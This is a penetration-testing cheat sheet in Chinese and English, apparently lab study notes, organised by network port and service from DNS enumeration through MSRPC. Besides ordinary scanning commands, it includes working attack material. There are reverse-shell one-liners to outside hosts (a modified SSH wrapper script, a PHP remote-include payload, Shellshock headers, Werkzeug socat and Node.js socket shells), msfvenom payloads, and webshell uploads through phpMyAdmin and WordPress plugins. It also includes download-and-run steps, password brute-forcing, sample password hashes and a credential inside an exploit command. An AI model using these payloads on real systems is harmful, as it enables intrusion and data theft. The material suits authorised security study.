
# Active info-gathering

## DNS Enum
### host

```bash
-t specify mx or txt, ns
host -t mx xxx.com

//domain 爆破，字典
for name in $(cat hostlist.txt); do host $name.megacorpone.com; done

//ip reverse lookup 
for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

// dns transfer
host -l domainname dns-server-addr

```

dns transfer auto script

```bash
// dns transfer auto
#!/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z "$1" ]; thenecho "[*] Simple Zone transfer script"
    echo "[*] Usage : $0 <domain name> "
exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 | cut -d " " -f4); do
 # For each of these servers, attempt a zone transfer
 host -l $1 $server |grep "has address"
done
```

Dns transfer auto, python3

```python
#!/bin/python3
# A Simple function that finds NS records, resolves their IP, and attempts a DNS Zone Transfer
import dns.zone
import dns.resolver

ns_servers = []
def dns_zone_xfer(address):
    ns_answer = dns.resolver.resolve(address, 'NS')
    for server in ns_answer:
        print("[*] Found NS: {}".format(server))
        ip_answer = dns.resolver.resolve(server.target, 'A')
        for ip in ip_answer:
            print("[*] IP for {} is {}".format(server, ip))
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(str(ip), address))
                for host in zone:
                    print("[*] Found Host: {}".format(host))
            except Exception as e:
                print("[*] NS {} refused zone transfer!".format(server))
                continue

dns_zone_xfer('megacorpone.com')
```

### DNSRecon

```bash
-d domain name
-D subdomain list
-t type of enum, axfr, brt
dnsrecon -d example.com -D ~/list.txt -t brt
```

### DNSenum

```bash
dnsenum example.com
```

## Port scanning

### nc

```bash
-w 指定timeout seconds
-z zero-1/0 mode，不发数据
-u udp scan
-n 使用ip地址，而不通过域名服务器
-v verbos,输出交互信息
-l liseten
-p 指定端口
-C sent CRLF as line-ending
nc -nvv -w 1 -z 10.11.1.220 3388-3390

//常用获取banner, 22/25
nc -nv ip 22
nc -nvC ip 22/25
```

### nmap
+ (中文手册)[http://www.nmap.com.cn/doc/manual.shtm#14]
+ socks proxy require TCP connection to be made, a half-open or SYN scan can not use with socks proxy
+ socks proxy require TCP connection, ICMP can not get through, need -Pn(disable ping)

```bash
Usage: nmap [Scan Type(s)] [Options] {target specification}
EXAMPLES:
nmap -v -A scanme.nmap.org
nmap -v -sP 192.168.0.0/16 10.0.0.0/8
nmap -v -iR 10000 -P0 -p 80
#常用参数
-Pn 默认所有主机在线，跳过host discovery；
-sP  //ping扫描，方便快速得出网络上运行的机器或监视服务器是否正常运行；默认ping扫描，主机存活情况下会继续扫描
-sS  //stealth，TCP SYN扫描，发送syn并接收syn-ack，关闭连接。执行快，半开扫描，一般情况下系统不记入系统日志，需root权限
-sT  //TCP connect扫描，syn不可用时默认扫描方式；时间长，目标机可能记录syslog
-sU  //UDP扫描，DNS（53）、DHCP（67/68）、SNMP（161/162）常见服务；扫描慢，可配合-sV帮助区分真正开放和过滤端口
-sN; -sF; -sX  //TCP Null、FIN、Xmas扫描，可躲过一些无状态防火墙和报文过滤路由器，扫描比SYN隐秘一些，但无法区分open和filtered端口
-sA  //TCP ACK扫描，可用于发现防火墙规则，确认是否有状态，那些端口被过滤；
-p <port ranges> //指定扫描端口或范围
-F //快速扫描优先端口，默认扫描1200 端口
-r //不按随机顺序扫描
-sV //端口服务版本探测， -A 可同时进行OS探测
-O //操作系统检测
--top-port=20 top20端口

-sn [ip段] //网段扫描，不执行端口扫描

-v //提高输出信息的详细度，-vv 输出更详细信息
-A //全面系统检测，OS、version detection，script scan，traceroute 

-oN/oG/oX [filename]//结果输出文件，text/grepable format/xml

--min-rate # minimum number of packets to be sent at once
--max-rate # maximum number of packets to be sent at once

# output ports
nmap -F -oG - -v

```

* 常用扫描

```bash
# 网段扫描
## -sn, ping scan
## -PE, icmp echo
nmap -sn -PE 172.16.1.0/24   //网段扫描
nmap -vvv -sn 172.16.1.0/24 -oG pingscan.txt 
nmap -sP 171.16.1.0-100
grep Up pingscan.txt | cut -d " " -f 2 //grep up主机

//网段扫描，80端口
nmap -p 80 $ipnet.1-254 -oG web-sweep.txt
grep open web-sweep.txt | cut -d" " -f2 //grep 80 open host

//网段扫描，top 20端口， /usr/share/nmap/namp-services
nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt

//Enum 
#-light scan
nmap 10.11.1.72 --top-ports 10 --open

#-heavy scan
nmap 10.11.1.72 -p- -sV --reason --dns-server [REDACTED]

#-heavy scan, Full tcp
nmap 10.11.1.72 -p- -sT --reason --open --dns-server [REDACTED]

#-heavy scan, open port sV
nmap 10.11.1.72 -p 22,25,80,110,111,119,2049,4555 -sV --reason --dns-server [REDACTED]

nmap -sV -Pn -n -O [ip]  //tcp端口
nmap -sU -sV -n [ip]   // udp端口
nmap -Pn -n -sV -p1-65535 [ip]// -p指定端口

// OS frigerprint
sudo nmap -O ip

#输出文件过滤在线的主机并将ip输出到文件
cat ip.txt | grep -B 1 "Host is up"
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' ip.txt > iplist.txt

#扫描ip段并输出特定端口开放的主机
nmap -vvv -p 80 172.16.1.0-100 -oG - | grep 80/open
```

* namp script

```bash
// /usr/share/nmap/scripts
locate *.nse
nmap --script scriptname 192.169.1.2
nmap --script-help [xxx.nse] //查看nse文档

nmap --script script1.nse,script2,nse 192.168.3.2

nmap -sC example.com //default scripts

// smb os discovery
nmap ip --script=smb-os-discovery 

// dns zone transfer
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

* Metasploit nmap

```bash
host/services  //dbnmap 扫描结果查看

#nmap扫描输出xml，导入metasploit db
nmap -192.168.3.2 -oX  report.xml
db_import  /path/to/report.xml

nmap 192.168.3.2 -oA result //建议输出所有格式结果，便于查看

#Metasplolt portscan modules
use auxiliary/scanner/portscan/
```

### nmap sc

```bash
//nmap script db
cd /usr/share/nmap/scripts
head -n 5 script.db
cat script.db | grep '"vuln"\|"exploit"'

// nse vuln script scan
sudo nmap --script vuln 10.11.1.10
```

### scan time
调整参数
性能相关参数[说明](https://www.hackingarticles.in/nmap-scan-with-timing-parameters/)

```bash
--max-retries
--min-retries

--min-rate
--max-rate

--host-timeout 10ms

--min-hostgroup 3
--max-hostgroup 3

--scan-delay 11s

# Parallelism attribute is used to send multiple packets in parallel
--min-parallelism 2
--max-parallelism 2
```


### masscan

```bash
--rate=xx packet transmission rate
-e  raw network interface
--route-ip gateway
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1

masscan -p1-65535 ip --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports ip
```

## Network Enum

### nc网络发现

```bash
nc -nvv -w 1 -z $ip 3388-3390
```

### netdiscover

```bash
arp-scan $ip/24  // 扫子网在线主机
arp-scan -l  //同上
netdiscover -r $ip/24 // 扫子网ip、mac及mac供应商
netdiscover
```


# Common ports and Services

## ports/services
http://www.0daysecurity.com/penetration-testing/enumeration.html

| 端口号 | 端口说明 | 攻击技巧 |
|--------|--------|--------|
|21/22/69 |ftp/tftp：文件传输协议 |爆破\嗅探\溢出\后门|
|22 |ssh：远程连接 |爆破OpenSSH；28个退格|
|23 |telnet：远程连接 |爆破\嗅探|
|25 |smtp：邮件服务 |邮件伪造|
|53    |DNS：域名系统 |DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙|
|67/68 |dhcp |劫持\欺骗|
|110 |pop3 |爆破|
|139 |samba |爆破\未授权访问\远程代码执行|
|143 |imap |爆破|
|161 |snmp |爆破|
|389 |ldap |注入攻击\未授权访问|
|512/513/514 |linux r|直接使用rlogin|
|873 |rsync |未授权访问|
|1080 |socket |爆破：进行内网渗透|
|1352 |lotus |爆破：弱口令\信息泄漏：源代码|
|1433 |mssql |爆破：使用系统用户登录\注入攻击|
|1521 |oracle |爆破：TNS\注入攻击|
|2049 |nfs |配置不当|
|2181 |zookeeper |未授权访问|
|3306 |mysql |爆破\拒绝服务\注入|
|3389 |rdp |爆破\Shift后门|
|4848 |glassfish |爆破：控制台弱口令\认证绕过|
|5000 |sybase/DB2 |爆破\注入|
|5432 |postgresql |缓冲区溢出\注入攻击\爆破：弱口令|
|5632 |pcanywhere |拒绝服务\代码执行|
|5900 |vnc |爆破：弱口令\认证绕过|
|6379 |redis |未授权访问\爆破：弱口令|
|7001 |weblogic |Java反序列化\控制台弱口令\控制台部署webshell|
|80/443/8080 |web |常见web攻击\控制台爆破\对应服务器版本漏洞|
|8069 |zabbix |远程命令执行|
|9090 |websphere控制台 |爆破：控制台弱口令\Java反序列|
|9200/9300 |elasticsearch |远程代码执行|
|11211 |memcacache |未授权访问|
|27017 |mongodb |爆破\未授权访问|

引用：https://www.91ri.org/15441.html
wooyun也有讨论：http://zone.wooyun.org/content/18959
对于端口也就是一个服务的利用，上文也只是大概的讲述，一些常见的详细利用与防御可以看看：
http://wiki.wooyun.org/enterprise:server

## service unknow

```bash
amap -d 192.168.3.2 8000
```

## knocking
nmap 扫描端口filterd，可能有knockd服务防护
参考：https://zhuanlan.zhihu.com/p/43716885
配合web漏洞获取/etc/knockd.conf文件，查看openSSH sequence

```bash
knock -v 7000 8000 9000
nmap -sV -A -p 22 $tip
```

## 21-ftp
+ default credentials login
+ get file and search, notice the hidden files.
+ upload file/script then exploit with web vuln


```bash
# default creds
anonymous:anonymous
anonymous:
guest:
ftp:ftp
admin:admin

nmap --script ftp-* -p 21  <ip>

//browser connection
ftp://anonymous:anonymous@10.10.10.98

//down all file
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
wget -r ftp://anonymous@$tip:30021

ftp 192.168.3.2
nc 192.168.3.2 21 //匿名登录

ftp $tip
Anonymous

ls 
get
```

* anonymous login - get shell
ftp匿名登录，可能为web服务的路径，上传webshell后 get shell
aspnet_client, iisstart.htm, iis-85.png

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=19.168.119.196 LPORT=444 -f aspx > test.aspx

ftp>put test.aspx
ftp>ls

//web access test.aspx

nc -nvlp 4444
```

* brute force login

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt


## 22-ssh
+ [key fingerprint](https://github.com/rapid7/ssh-badkeys)
+ Now what happens if you see multiple SSH services on different ports which have the same key? 
+ What could it mean if they are different? 
+ Why would you see the same key on another box
+ when you got username, try ssh weak password and brure force, eg. user:user
+ ssh login limited, try to overwrite the auth_keys
+ if you have any password, try ssh login.

```bash
//get ssh key fingerprint
ssh root@192.168.3.2
ssh 192.168.3.2

## ssh domain user login 
ssh -l user@domain ip

//banner
nc 192.168.3.2 22

//nmap nse banner
nmap 10.11.1.71 -p 22 -sV --script=ssh-hostkey
```

**ssh key login**
```bash
# 1密码可回车跳过，生成公私钥id_rsa id_rsa.pub
ssh-keygen -t rsa -b 4096  
ls ~/.ssh
# 2 copy公钥至server ~/.ssh/目录，命名为authorized_keys
ssh-copy-id -i /root/.ssh/id_rsa.pub root@servip
# 或 生成authorized_keys 写入公钥内容，已有文件可追加
touch authorized_keys
cat id_rsa.pub > authorized_keys
cat id_rsa.pub > authorized_keys  //追加

# 3 登录，-i指定私钥文件,默认.ssh路径下
ssh -i [id_rsa file] [user]@ip
ssh user@ip
```

**ssh brute**

```bash
hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.120.85 -t 4 -w 5 -f

medusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4

ncrack 192.168.120.85 -U users.txt -P users.txt -p ssh -f -v
```

**ssh key login limited**
+ pg-sorcerer, ssh login limited to wrapper.sh
+ check authorized_keys, command; change wrapper.sh or authorized_keys
+ use scp to overwrite the file and ssh with key.

```bash
# authorized_keys content, limited ssh login to execute wrapper.sh
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0

# wrapper.sh
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac

## change wrapper
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac

## wrapper, or
#!/bin/bash
bash

## wrapper, change echo content to verify.
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "Hello."
    bash
    ;;
esac

scp -i keys ./wrapper.sh max@ip:/home/max/
ssh -i keys max@ip
```

## 23-telnet

telnet 未加密，较多已知的RCE漏洞。

```bash
hydra -l root -P pwd.txt 192.168.3.2 telnet
```

## 25/464/587-smtp
+ 邮件服务，server2server。可获取email地址
+ smtp rce

|commands|comment|
|:----|:-----|
|HELO||
|EHLO|Extended SMTP|
|STARTTLS|SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic|
|RCPT|Address of the recipient|
|DATA | Starts the transfer of the message contents|
|RSET|Used to abort the current email transaction.|
|MAIL | Specifies the email address of the sender.|
|QUIT | Closes the connection.|
|HELP | Asks for the help screen.|
|AUTH | Used to authenticate the client to the server.|
|VRFY | Asks the server to verify is the email user's mailbox exists.|
|EXPN| ask the server for membership of a mailing list|

```bash
port 25, Simple Mail Transport Protocal
#-banner
nc -nv ip 25
nc -nvC ip 25 //wireshark抓包，查看行结束符\r\n 增加-C
telnet ip 25

RCPT - Address of the recipient.
DATA - Starts the transfer of the message contents.

#手动获取,validate SMTP users
nc 192.168.3.2 25
VRFY root

telnet 192.168.3.2 25

#自动化&脚本
nmap --script smtp-commands.nse 192.68.3.2 
smtp-user-enum -M VRFY -U names.txt -t 192.168.3.2
msf > use auxiliary/scanner/smtp/smtp_enum 

# rce 47984, pg bratarina
## wget no need http://
python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
python3 47984.py 192.168.135.71 25 '/tmp/shell'

# sendmail
## -f, from address
## -t, to address
## -s, target and port
## -u, subject
## -m, message
## -a, attatchment
sendemail -f 'jonas@localhost' \
    -t 'mailadmin@localhost' \
    -s 192.168.120.132:25 \
    -u 'Your spreadsheet' \
    -m 'Here is your requested spreadsheet' \
    -a bomb.ods
```

**Automate guess**

```python
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
  print "Usage: vrfy.py <username>"
  sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('10.11.1.217',25))
# Receive the banner
banner = s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
# Close the socket
s.close()
```

```python
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
  print "Usage: vrfy.py <usernamelist>"
  sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('10.11.1.217',25))
# Receive the banner
banner = s.recv(1024)
print banner

file_open = open(sys.argv[1], "r")
for line in file_open:
    # VRFY a user
    s.send('VRFY ' + sys.argv[1] + '\r\n')
    result = s.recv(1024)
    print result

# Close the socket
s.close()
```

## 69-TFTP

参考：https://dominicbreuker.com/post/htb_dropzone/

**default file to get**

|os | file|
|----|----|
|linux|/etc/passwd|
|windows|c:\windows\system32\license.rtf|
|windows|c:\windows\system32\drivers\etc\hosts|
|windows xp|c:\boot.ini|

**windows path trick**
> dir /x， PROGRA~1； deal with space issue

```bash
PORT   STATE SERVICE REASON
69/udp open  tftp    script-set

#-Enumeration
nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>

#-Download file 
msf5> auxiliary/admin/tftp/tftp_transfer_util

#-command
tftp>? #hlep
tftp>binary/assci #file transfer mode
tftp>timeout 10  #set timeout 10 seconds
tftp>get /windows/system32/drivers/etc/hosts
tftp>put hello.txt
```

download file py
```python
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```

## 79-finger
> Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

+ enum user, enum banner/version
+ finger commond execution

```bash
# banner enum.
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79

# user enum
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user

## enum user perl scripts
## https://pentestmonkey.net/tools/user-enumeration/finger-user-enum
## seclists/Usernames/Names/names.txt
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt

# finger command execution
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

## 80/443-http(s)
+ web attack
+ ssl heart bleeding exploit
+ common cms/web service

```bash
#htaccess爆破
medusa -h 192.68.3.2 -u root -P password.txt -M http  -m DIR:/test -T 10

//grab links
curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

### openssl heartbleed
+ 1.0.1-1.0.1f vulnerable
+ 1.0.1g  not vulnerable
+ 1.0.0, 0.9.8 not vulnerable

```bash
#heartbleed 检测
sudo sslscan 192.168.3.2:443
nmap -sV --script=ssl-heartbleed 192.168.3.2

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
```

### Simple PHP Photo Gallery
+ version 0.8, [remote file include](https://www.exploit-db.com/exploits/48424)
+ pg-snookums
+ 

```bash
cat evil.txt
<?php echo system('bash -i >& /dev/tcp/192.168.49.215/445 0>&1'); ?>

http://192.168.215.58/image.php?img=http://192.168.49.215/evil.txt
http://192.168.215.58/image.php?img=http://192.168.49.215/evil.txt&cmd=id
```

### NodeBB
+ nodebb, plugin enoji version 3.2.1; [Arbitrary File Write](https://www.exploit-db.com/exploits/49813)
+ pg-tico

```bash

```

### Werkzeug
+ python web service
+ console rce if debug actived
+ more, https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

```bash
# web port
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)

# console rce
__import__('os').popen('whoami').read();
os.system('socat TCP:192.168.118.8:18000 EXEC:sh')
```

### Subrion CMS
+ v4.2.1, [Remote Code Execution](https://www.exploit-db.com/exploits/49876); pg-exfiltrated

### Zenphoto
+ version 1.4.1.4, [RCE](https://www.exploit-db.com/exploits/18083)
+ pg-zenphoto

### CGI
+ check sherlock vuln; htb shocker, beep

```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi

# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh

python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```

**exploit**

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.41/80 0>&1' http://10.10.10.56/cgi-bin/user.sh

#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8

#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi

#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```


### Cold Fusion
参考
http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers

```
example.com/CFIDE/adminapi/base.cfc?wsdl    //查看版本

use exploit/windows/http/coldfusion_fckeditor //fckeditor  8.0.1 利用

#LFI获取password
http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

### Phpmyadmin

```
#默认账号,密码空
root:
pma:

#phpmyadmin 执行sql上传shell
http://192.168.3.2/phpmyadmin/
//Run SQL query/queries on server "localhost":

SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
# For linux
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"

#linux download shell
?cmd=wget%20192.168.1.102/shell.php
```

### webdav
参考
http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf
```
#access 
cadaver [ip]/webdav

#default user
wampp:xampp

#put/get upload and download 

davtest --url http://[ip] -dirrectory demo_dir -rand pocfile

#文件后缀限制绕过
rename  shell.asp;.jpg

```

### webmin
webgui to interact with the machine
port 1000


### wordpress

```
#wpscan
wpscan -u http://[ip]

#403 可尝试更换ua 绕过
wpscan -u http://[ip] --random-agent

#wpscan enumerat user
wpscan --url http://$tip/ -e u
wpscan --url http://$tip/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```
wp-admin
activity monitor,  已知RCE 获取shell，参考DC6

上传plugin getshel
```
/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php

//打包zip文件， 以便 wordpress 识别为plugin
sudo zip plugin-shell.zip pluginshell.php

//plugins -- add plugins -- install

curl http://sandbox.local/wp-content/plugins/plugin-hell/pluginshell.php?cmd=whoami

//生产 meterpreter payload，python web download
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf

//download
curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=wget%20http://10.11.0.4/shell.elf

// chmod +x
curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=chmod%20%2bx%20shell.elf

msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
set LHOST 192.168.119.196;\
set LPORT 443;\
run"

http://10.11.1.250/wp-content/plugins/plugin-shell-2/plugin-shell.php?cmd=whoami
```

### joomla
+ droopescan supported.

```
joomscan -u http://$tip/

#nmap script brute
nmap --script http-joomla-brute --script-args='userdb=./users.txt,passdb=/usre/share/wordlists/rockyou.txt,http-joomla-brute.hostname=192.168.3.45,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.3.45
```
1. 3.7.0  sql 注入
2. 登录后，修改template页面 beez3 index.php ，get shell

### drupal cms
+ sql注入、反序列化RCE、module rce，参考DC-7
+ 自定义module上传后rce，[参考](https://www.drupal.org/project/drupal/issues/3093274)
+ 已有module上传后rce, [down](https://www.drupal.org/project/php)，过程参考hacking articals [walkthrough](https://www.hackingarticles.in/dc7-vulnhub-walkthrough/)
+ drupal scan, [droopescan](https://github.com/SamJoan/droopescan)

```
#drush 重置账号密码
drush user-password admin --password="hello123"

#module Rce 
upload tar -- install tar -- enable module
set attack ip port
preview   -- get shell

# droopescan, version/path
## installed in pt3, pip
pip install droopescan

droopescan scan --help
droopescan scan drupal -u example.org
 droopescan scan -u example.org

```

### Nodejs-RCE
+ express middleware
+ function rce - pg dibble

```bash
# test
(function(){
   return 2+2;
})();

# rce function
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(21, "192.168.118.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();

```

### Kibana - RCE
+ rce, https://github.com/mpgn/CVE-2019-7609, https://github.com/LandGrey/CVE-2019-7609


### Nexus 
+ default credential login
+ rce

```bash
nexus:nexus

# rce
https://www.exploit-db.com/exploits/49385
```

### IIS 6
+ IIS 6 CVE-2017-7269, lead to rce/bof to rce; [leads to rce](https://www.trendmicro.com/en_us/research/17/c/iis-6-0-vulnerability-leads-code-execution.html)
+ webdav put/move to rce, exploit reference, [sinfulz granny walkthrough](https://medium.com/@sinfulz/hackthebox-granny-walkthrough-oscp-friendly-cf800b42ce7a)

```bash
# davtest, check if file uploaded.
davtest --url http://ip:port

# another exploit
## https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
python2 targetip targetport lhost lport
```

### magento
+ magento scan, enum version/vulns;[magescan](https://github.com/steverobbins/magescan)
+ sqli add admin user, php objection injection > rce

```bash
# https://github.com/steverobbins/magescan
php magescan.phar scan:all swagshop.htb

```

### Nodejs 
+ check the app.js, contains api routes for site; htb node
+ 

## 88tcp/udp-kerberos
+ ms14-068 exploit, Windows Server 2003/Windows Server 2008/Windows Server 2008 R2/Windows Server 2012/Windows Server 2012 R2
+ asrepoast/kerberoast/user brute
+ 一般88端口开放，可考虑windows domain controller; [hacktricks-kerberos](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)

```bash
# impacket exploit, ms14-068
## add hosts first
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis
```

## 110/995-Pop3
邮件服务，获取邮件
USER/PASS 登录
```bash
telnet 192.68.3.2 110
USER test@192.168.3.2
PASS admin

//nc
nc -nv ip 110
USER root
PASS root

list
retr 5 // retrive email number5
```

|command|comment|
|:----|:----|
|USER|user name for this mail server|
|PASS|password|
|QUIT|End session|
|STAT|Number and total size of all messages|
|LIST|Message # and size of message|
|RETR message#|Retrieve selected message|
|DELE message#|Delete selected message|
|NOOP|No-op Keeps you connection open|
|RSET|Reset the mailbox. Undelete deleted messages|


## 111tcp/udp-Rpcbind
Remote Procedure Calls 
查看NFS-shares(lab-72)
Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service
```bash
rpcbind -pi [ip]

nc -nv ip 111

nmap -sSUC -p111 $tip
//
rpcinfo -s ip
rpcinfo -p ip
```

### NIS
+ if find the service **ypbind** running, try exploit:
+ guess NIS domain name
+ ypwhich to ping 
+ ypcat to obtain sensitive info

```bash
apt-get install nis

ypwhich -d example.org 192.168.10.1

ypcat –d example.org –h 192.168.10.1 passwd.byname

tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash
```

|**Master file**|**Map**|**Notes**|
|:----|:----|:----|
|/etc/hosts|host.byname, hosts.byaddr|contains hostnames and ip details|
|/etc/passwd|passwd.byname, passwd.byuid|NIS user password file|
|/etc/group|group.byname, group.bygid|NIS group file|
|/usr/lib/aliases|mail.aliases|Details mail aliases|

### RPC Users
**rusersd** service
enumerate users of the target [1026 - Pentesting Rsusersd](/pentesting/1026-pentesting-rusersd).

## 113-ident
an [Internet](https://en.wikipedia.org/wiki/Internet)  [protocol](https://en.wikipedia.org/wiki/Protocol_(computing)) that helps identify the user of a particular [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) connection
+ default port, 113
+ user enum 
+ get user/identify the service
+ practise, pg - peppo


```bash
PORT    STATE SERVICE
113/tcp open  ident

# nmap scan, defaut -sC will identify user of every running port
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA)
|_  2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA)
113/tcp open  ident
|_auth-owners: identd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)
|_auth-owners: root
445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)
|_auth-owners: root

# ident-user-enum
ident-user-enum 192.168.1.100 22 113 139 445
```

## 119-NNTP
Network time protocol，同步时间服务器
可进行时间修改，可能造成dos

```bash
//banner grab
nc -nvC ip 119
HELP
LIST //list articles available

```

## 135/593-MSRPC
+ windows rpc-port
+ maybe got the user and password of domain user. pg-resourced
+ rpc enum, use -U '' if anonymous enum not work

```bash
msf> use exploit/windows/dcerpc/ms03_026_dcom

#nmap
nmap --script=msrpc-enum ip
nmap -n -v -sV -Pn 192.168.0.101 --script=msrpc-enum

#rpcclient
